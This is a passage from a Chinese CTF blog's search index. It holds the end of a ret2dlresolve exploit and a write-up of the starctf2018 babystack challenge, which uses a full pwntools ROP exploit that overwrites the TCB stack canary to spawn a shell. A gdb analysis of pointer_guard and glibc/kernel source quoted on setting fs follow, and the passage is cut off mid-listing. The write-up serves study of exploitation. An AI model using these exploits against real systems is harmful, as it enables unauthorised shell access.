elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr</span><br><span class="line"># got</span><br><span class="line">fake_index &#x3D; base_stage + 20 - rel_plt</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line"># info</span><br><span class="line">fake_sym_addr &#x3D; base_stage + 28</span><br><span class="line">align &#x3D; 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr &#x3D; fake_sym_addr+align</span><br><span class="line">fake_sym_offset &#x3D; (fake_sym_addr - dynsym)&#x2F;0x10</span><br><span class="line">r_info &#x3D; (fake_sym_offset &lt;&lt; 8) | 0x7</span><br><span class="line">fake_func_str_addr &#x3D; fake_sym_addr+0x10-dynstr</span><br><span class="line">fake_write_sym &#x3D; p32(fake_func_str_addr)+p32(0)+p32(0)+p32(0x12)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; p32(0xdeadbeef)</span><br><span class="line">payload +&#x3D; p32(plt0)</span><br><span class="line">payload +&#x3D; p32(fake_index)</span><br><span class="line">payload +&#x3D; p32(0xdeadbeef)</span><br><span class="line">#payload +&#x3D; p32(1)</span><br><span class="line">payload +&#x3D; p32(base_stage+80)</span><br><span class="line">#payload +&#x3D; p32(len(sh))</span><br><span class="line">payload +&#x3D; p32(write_got)</span><br><span class="line">payload +&#x3D; p32(r_info)</span><br><span class="line">payload +&#x3D; &#39;a&#39; *align</span><br><span class="line">payload +&#x3D; p32(fake_func_str_addr)</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line">payload +&#x3D; p32(0x12)</span><br><span class="line">payload +&#x3D; &quot;system\x00&quot;</span><br><span class="line">payload +&#x3D; &#39;a&#39; * (80-len(payload))</span><br><span class="line">payload +&#x3D; sh +&#39;\x00&#39;</span><br><span class="line">payload +&#x3D; &#39;a&#39; * (100- len(payload))</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/image/ret2dl/success.png" alt="success"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass Canary</title>
      <link href="bypass-Canary.html"/>
      <url>bypass-Canary.html</url>
      
        <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>这道题是来自starctf2018的一道pwn题，主要是通过覆盖TCB结构体中的stack_guard值来bypass Canary的校验过程</p><p>赛题链接:  <a href="https://github.com/sixstars/starctf2018/tree/master/pwn-babystack">https://github.com/sixstars/starctf2018/tree/master/pwn-babystack</a></p><p>TCB介绍: <a href="http://www.openwall.com/lists/oss-security/2018/02/27/5">http://www.openwall.com/lists/oss-security/2018/02/27/5</a></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Ubuntu 18.04 64位</li><li>libc-2.27</li></ul><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>由于大致了解解题细节，所以我就直接拿现成的exp来先运行试一下，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"># [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span><br><span class="line">context.log_level = &#x27;INFO&#x27;</span><br><span class="line"></span><br><span class="line">libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="line">bin_path = &#x27;./bs&#x27;</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">binary = ELF(bin_path)</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;&#x27;</span></span><br><span class="line">port = 6666</span><br><span class="line"></span><br><span class="line">def debug(command=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    #debug(&#x27;b *0x4009E7\n&#x27;)</span><br><span class="line">    g = lambda x: next(binary.search(asm(x, os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)))</span><br><span class="line">    pop_rdi = g(&#x27;pop rdi; ret&#x27;)</span><br><span class="line">    pop_rsi_pop = g(&#x27;pop rsi; pop r15; ret&#x27;)</span><br><span class="line">    leave = g(&#x27;leave; ret&#x27;)</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;pop_rdi:     &quot;</span> + hex(pop_rdi))</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;pop_rsi_pop: &quot;</span> + hex(pop_rsi_pop))</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;leave:       &quot;</span> + hex(leave))</span><br><span class="line"></span><br><span class="line">    size = <span class="number">8300</span></span><br><span class="line">    p.sendlineafter(&#x27;send?\n&#x27;, str(size))</span><br><span class="line"></span><br><span class="line">    fakebuf = <span class="number">0x602f00</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += &#x27;A&#x27;*0x1010</span><br><span class="line">    <span class="meta"># stack pivot #step 1</span></span><br><span class="line">    payload += p64(fakebuf)</span><br><span class="line">    # ROP1 - leak libc </span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(binary.got[&#x27;puts&#x27;])</span><br><span class="line">    payload += p64(binary.plt[&#x27;puts&#x27;])</span><br><span class="line">    # ROP2 - read </span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rsi_pop)</span><br><span class="line">    payload += p64(fakebuf)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(binary.plt[&#x27;read&#x27;])</span><br><span class="line">    <span class="meta"># stack pivot #step 2</span></span><br><span class="line">    payload += p64(leave)</span><br><span class="line">   # Override TCB Canary</span><br><span class="line">    payload = payload.ljust(size, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(&#x27;goodbye.\n&#x27;)</span><br><span class="line">    leak = p.recvline().strip()[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    leak = u64(leak)</span><br><span class="line">    libc.address = leak - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">    info(<span class="string">&quot;%#x&quot;</span>, libc.address)</span><br><span class="line">    bin_sh = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">    system = libc.sym[&#x27;system&#x27;]</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += p64(0)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(bin_sh)</span><br><span class="line">    payload += p64(system)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">len</span><span class="params">(sys.argv)</span> </span>== <span class="number">1</span>:</span><br><span class="line">        global p</span><br><span class="line">        p = process(executable=bin_path, argv=[bin_path]) #, env=&#123;&#x27;LD_PRELOAD&#x27;:libc_path&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(sys.argv[<span class="number">1</span>], <span class="keyword">int</span>(sys.argv[<span class="number">2</span>]))</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure><p>这里我没有使用官方的libc(主要是我没找到。。)，直接使用了系统的libc</p><p>主要的过程在注释里写的差不多了，大致上就是</p><ul><li>计算偏移，先填充0x1010个“A”至rbp(这一步同时覆盖了栈上的Canary为“AAAA”)</li><li>stack pivot劫持rbp至.bss段</li><li>由于libc默认PIE，所以需要调用puts函数leak出puts函数在got表的绝对地址</li><li>寻找pop_rsi_pop、pop_rdi等一系列gadget，控制寄存器，准备调用read函数的参数</li><li>根据puts leak出的puts函数在got表的绝对地址，计算偏移得到libc的基地址，并基于libc的基地址算出read函数的绝对地址</li><li>构造ROP，用“A”填充ROP至8300个字节(这一步同时利用超长的“A”，覆盖了TCB中的stack_guard值为“AAAA”，从而绕过Canary的校验)</li><li>将ROP填入栈上对应位置</li><li>在我们填入的read函数被调用时，将真正的exp通过read函数写入.bss上被劫持的栈</li><li>最后leave，将栈完全劫持到.bss段执行</li></ul><p>过程还是比较明了的，于是我运行了一下</p><p>然而，这个exp在我的机器上并不能成功的getshell，但是，在ubuntu 16.04上却可以成功getshell。</p><p>疑惑.jpg，话不多说，gdb搞起</p><h1 id="WHY"><a href="#WHY" class="headerlink" title="WHY?"></a>WHY?</h1><p>gdb单步调试至我们最终执行的payload处</p><p>首先，可以看到程序确实被劫持到了system函数，并且rdi确实指向了“/bin/sh”字符串</p><p><img src="/image/bypass-Canary/enter_system.png" alt="enter_system"></p><p>看上去一切正常，继续跟进去看看</p><p>当我调试到这一步时，程序崩溃了</p><p><img src="/image/bypass-Canary/rax_gg.png" alt="rax_gg"></p><p>可以看到，<code>&lt;do_system+359&gt; call rax</code>尝试调用rax寄存器所指向的函数</p><p>但仔细看一下rax的值，可以发现为0x74e75a79b3d1d1ee，远远超出了可以访问的内存地址空间</p><p>所以自然而然的，程序在此崩溃</p><p>那么为什么会出现这么异常的rax值呢？</p><p>我把目光放在了前面的一段汇编代码上，即<code>&lt;do_system+343&gt; xor rax, QWORD PTR fs:0x30</code> </p><p>我将<code>0x74e75a79b3d1d1ee</code>与xor之前的rax的值<code>0x35a61b38f29090af</code>进行xor，得到了<code>fs:0x30</code>的值为<code>0x4141414141414141</code></p><p>看到这，可能有人还是不理解，这里贴一下64位程序中TCB的结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;                <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                           thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;                <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">int</span> gscope_flag;  <span class="comment">// 32位下没有这个成员</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> feature_1;</span><br><span class="line">  <span class="keyword">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="keyword">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="keyword">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line">  <span class="keyword">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看到这儿想必大家也知道了原因，由于<code>fs:0x28</code>处就是stack_guard，而原payload在没有计算任何偏移的情况下暴力覆盖了8300个字节，在覆盖stack_guard的同时也将<code>fs:0x30</code>处的<code>pointer_guard</code>覆盖为了<code>0x4141414141414141</code>而在libc2.27中的system函数在实现过程中需要利用这个值做指针的解密，解密的过程可以在图中的汇编看到，我这里总结一下(⊕ 为异或)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptr(enc) = ror64(ptr(orig) ⊕ rand, <span class="number">0x11</span>) <span class="comment">// rand的值就是pointer_guard的值</span></span><br><span class="line">ptr(orig) = rol64(ptr(enc), <span class="number">0x11</span>) ⊕ rand</span><br></pre></td></tr></table></figure><p>在windows上，解密方法则有些不一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptr(enc) = ror64(ptr(orig) ⊕ rand, rand)</span><br><span class="line">ptr(orig) = rol64(ptr(enc), rand) ⊕ rand</span><br></pre></td></tr></table></figure><p>这里也简单说一下<code>pointer_guard</code>的用处，<code>pointer_guard</code>旨在保护存储在用户可读写的内存当中的函数地址，防止攻击者读出真实函数地址，从而绕过类似aslr等一系列防护机制</p><p>我们可以从上面的两种解密方法发现，windows和linux的加解密方法是一致的(除了0x11)，但实际上，linux以及windows在这个rand值上的处理也是有很大的区别的</p><p>在我们的漏洞利用中，我们实际上通过栈溢出覆盖了这个rand值(也就是pointer_guard)</p><p>换句话说，linux将这个rand值保存在了TCB中，而TCB实际上也可以被用户访问并改写</p><p>而windows则不然，windows将这个值存在了kernel中，用户无法对其修改读取(有kernel的洞就当我没说</p><p>所以实际上linux对此机制的实现是不安全的(同理，<code>stack_guard</code>也与<code>pointer_guard</code>一样)</p><p>那么由于解密失败，于是便触发了崩溃。</p><p>那要解决这个问题其实很简单，我们可以看到，<code>stack_guard</code>在相对于<code>pointer_guard</code>的低位，所以我们只需要精确计算出需要覆盖的偏移量，仅覆盖至<code>stack_guard</code>即可</p><p>通过命令<code>x/32gx pthread_self()</code>我查看到了TCB的结构以及其地址，确定了<code>stack_guard</code>与溢出点<code>buf</code>之间的偏移</p><p>TIPS：在gdb中，你是无法直接查看到fs寄存器真正指向的地址的，<del>这是由于在保护模式下fs寄存器中保存的将不再是基地址，而是段选择子，需要基于此值去gdt或者ldt中查表才可以得到真正的基地址，</del> 这是由于我们所能看到的所有段寄存器的16位数值都是<strong>段选择子</strong>，而不是真正的<strong>基地址</strong>，真正的<strong>基地址</strong>是我们不可见的，需要使用<strong>段选择子</strong>的值去gdt或者ldt中查表才可以得到我们<strong>不可见</strong>的<strong>基地址</strong>，但是<code>fs/gs</code>寄存器是个例外(在linux x86_64系统上)，他们与其他四个段寄存器在保护模式下的表现是不一样的，我们可见的<code>fs/gs</code>的16位数值将不是如同其他四个段寄存器一般是<strong>段选择子</strong>，而是恒为0(在linux x86_64系统上运行的64位程序)，但是，我们又知道fs寄存器中保存着<strong>不可见</strong>的线程TCB的起始地址，那么在恒为0的情况下，是谁来改变这个<strong>不可见</strong>的线程TCB的起始地址呢？</p><p><del>答案是cpu在进行线程切换时会使用<code>wrmsr</code>直接修改fs段寄存器的值为当前线程的TCB的起始地址</del></p><p>调试后发现是由glibc在线程启动之前主动调用了<code>TLS_INIT_TP -&gt; arch_prctl(syscall)</code>从而改变了fs寄存器的基地址，下面是部分代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Code to initially initialize the thread pointer.  This might need</span></span><br><span class="line"><span class="comment">   special attention since &#x27;errno&#x27; is not yet available and if the</span></span><br><span class="line"><span class="comment">   operation can cause a failure &#x27;errno&#x27; must not be touched.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   We have to make the syscall for both uses of the macro since the</span></span><br><span class="line"><span class="comment">   address might be (and probably is) different.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TLS_INIT_TP(thrdescr) \</span></span><br><span class="line">  (&#123; <span class="keyword">void</span> *_thrdescr = (thrdescr);      \</span><br><span class="line">     <span class="keyword">tcbhead_t</span> *_head = _thrdescr;      \</span><br><span class="line">     <span class="keyword">int</span> _result;      \</span><br><span class="line">      \</span><br><span class="line">     _head-&gt;tcb = _thrdescr;      \</span><br><span class="line">     <span class="comment">/* For now the thread descriptor is at the same address.  */</span>      \</span><br><span class="line">     _head-&gt;self = _thrdescr;      \</span><br><span class="line">      \</span><br><span class="line">     <span class="comment">/* It is a simple syscall to set the %fs value for the thread.  */</span>      \</span><br><span class="line">     <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;syscall&quot;</span>      \</span><br><span class="line">   : <span class="string">&quot;=a&quot;</span> (_result)      \</span><br><span class="line">   : <span class="string">&quot;0&quot;</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span>) __NR_arch_prctl),      \</span><br><span class="line">     <span class="string">&quot;D&quot;</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span>) ARCH_SET_FS),      \</span><br><span class="line">     <span class="string">&quot;S&quot;</span> (_thrdescr)      \</span><br><span class="line">   : <span class="string">&quot;memory&quot;</span>, <span class="string">&quot;cc&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;cx&quot;</span>);      \</span><br><span class="line">      \</span><br><span class="line">    _result ? <span class="string">&quot;cannot set %fs base address for thread-local storage&quot;</span> : <span class="number">0</span>;     \</span><br><span class="line">  &#125;)</span><br><span class="line">  ......</span><br><span class="line">  <span class="comment">// arch_prctl系统调用实现代码</span></span><br><span class="line">  <span class="function"><span class="keyword">long</span> <span class="title">do_arch_prctl</span><span class="params">(struct task_struct *task, <span class="keyword">int</span> code, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> doit = task == current;</span><br><span class="line"><span class="keyword">int</span> cpu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (code) &#123;</span><br><span class="line"><span class="keyword">case</span> ARCH_SET_GS:</span><br><span class="line"><span class="keyword">if</span> (addr &gt;= TASK_SIZE_OF(task))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line">cpu = get_cpu();</span><br><span class="line"><span class="comment">/* handle small bases via the GDT because that&#x27;s faster to</span></span><br><span class="line"><span class="comment">   switch. */</span></span><br><span class="line"><span class="keyword">if</span> (addr &lt;= <span class="number">0xffffffff</span>) &#123;</span><br><span class="line">set_32bit_tls(task, GS_TLS, addr);</span><br><span class="line"><span class="keyword">if</span> (doit) &#123;</span><br><span class="line">load_TLS(&amp;task-&gt;thread, cpu);</span><br><span class="line">load_gs_index(GS_TLS_SEL);</span><br><span class="line">&#125;</span><br><span class="line">task-&gt;thread.gsindex = GS_TLS_SEL;</span><br><span class="line">task-&gt;thread.gs = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">task-&gt;thread.gsindex = <span class="number">0</span>;</span><br><span class="line">task-&gt;thread.gs = addr;</span><br><span class="line"><span class="keyword">if</span> (doit) &#123;</span><br><span class="line">load_gs_index(<span class="number">0</span>);</span><br><span class="line">ret = wrmsrl_safe(MSR_KERNEL_GS_BASE, addr);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">put_cpu();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ARCH_SET_FS:</span><br><span class="line"><span class="comment">/* Not strictly needed for fs, but do it for symmetry</span></span><br><span class="line"><span class="comment">   with gs */</span></span><br><span class="line"><span class="keyword">if</span> (addr &gt;= TASK_SIZE_OF(task))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line">cpu = get_cpu();</span><br><span class="line"><span class="comment">/* handle small bases via the GDT because that&#x27;s faster to</span></span><br><span class="line"><span class="comment">   switch. */</span></span><br><span class="line"><span class="keyword">if</span> (addr &lt;= <span class="number">0xffffffff</span>) &#123; <span class="comment">// qemu+64位kernel+busybox+64位可执行程序情况下会进到这个分支，这应该是特殊情况，正式发行版并不会这样</span></span><br><span class="line">set_32bit_tls(task, FS_TLS, addr); <span class="comment">// 如果是传入的地址为32位，那么说明仍是段寻址，更新gdt中对应段描述符的值(虽然这里是fill_ldt)，从而间接改变基地址</span></span><br><span class="line"><span class="keyword">if</span> (doit) &#123; </span><br><span class="line">load_TLS(&amp;task-&gt;thread, cpu);</span><br><span class="line">loadsegment(fs, FS_TLS_SEL);</span><br><span class="line">&#125;</span><br><span class="line">task-&gt;thread.fsindex = FS_TLS_SEL;</span><br><span class="line">task-&gt;thread.fs = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">task-&gt;thread.fsindex = <span class="number">0</span>;</span><br><span class="line">task-&gt;thread.fs = addr;</span><br><span class="line"><span class="keyword">if</span> (doit) &#123; <span class="comment">// 如果发出系统调用的线程恰好为处理器正在执行的线程时，主动将fs置0并加载fsbase值，防止内核切换线程时重复操作</span></span><br><span class="line"><span class="comment">/* set the selector to 0 to not confuse</span></span><br><span class="line"><span class="comment">   __switch_to */</span></span><br><span class="line">loadsegment(fs, <span class="number">0</span>);  <span class="comment">// 装载fs为0</span></span><br><span class="line">ret = wrmsrl_safe(MSR_FS_BASE, addr); <span class="comment">// 与32位下的处理方式不同，这里直接改写基地址</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">put_cpu();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    (后面省略)</span><br><span class="line">   ......</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set_32bit_tls</span><span class="params">(struct task_struct *t, <span class="keyword">int</span> tls, u32 addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ud</span> =</span> &#123;</span><br><span class="line">.base_addr = addr,</span><br><span class="line">.limit = <span class="number">0xfffff</span>,</span><br><span class="line">.seg_32bit = <span class="number">1</span>,</span><br><span class="line">.limit_in_pages = <span class="number">1</span>,</span><br><span class="line">.useable = <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> *<span class="title">desc</span> =</span> t-&gt;thread.tls_array;</span><br><span class="line">desc += tls;</span><br><span class="line">fill_ldt(desc, &amp;ud);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，内核也会在调度线程时执行检查，确保下一个需要被调度的线程fsindex以及其base值无误</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 